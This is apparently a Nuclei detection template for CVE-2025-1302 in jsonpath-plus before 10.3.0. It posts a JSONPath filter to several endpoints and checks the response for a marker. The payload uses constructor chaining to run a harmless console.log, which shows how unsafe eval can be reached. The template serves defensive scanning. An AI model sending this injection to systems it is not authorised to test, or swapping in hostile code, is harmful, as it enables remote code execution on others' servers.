id: CVE-2025-1302

info:
  name: jsonpath-plus <10.3.0 - Safe Eval RCE Detection
  author: Jaenact
  severity: high
  description: |
    This template detects CVE-2025-1302 in jsonpath-plus (<10.3.0)
    using a safe eval()-based payload. The payload uses harmless
    JavaScript (console.log) to determine if unsafe evaluation occurs.
    This is a non-exploitive template suitable for safe security testing.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-1302
    - https://security.snyk.io/vuln/SNYK-JS-JSONPATHPLUS-8719585
    - https://github.com/JSONPath-Plus/JSONPath
    - https://github.com/EQSTLab/CVE-2025-1302

  tags: cve,rce,jsonpath,eval,safe,json,application,js

http:
  - method: POST
    path:
      - "{{BaseURL}}/query"
      - "{{BaseURL}}/jsonpath"
      - "{{BaseURL}}/api/query"
      - "{{BaseURL}}/data"
      - "{{BaseURL}}/parse"
      - "{{BaseURL}}/filter"
      - "{{BaseURL}}/expression"

    headers:
      Content-Type: application/json

    body: |
      {
        "path":
        "$..[?(EQST=''[['constructor']][['constructor']]('console.log(\"nuclei-safe\")');EQST())]"
      }
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'nuclei-safe'

      - type: word
        part: body
        negative: true
        words:
          - 'EQST'
          - '"path"'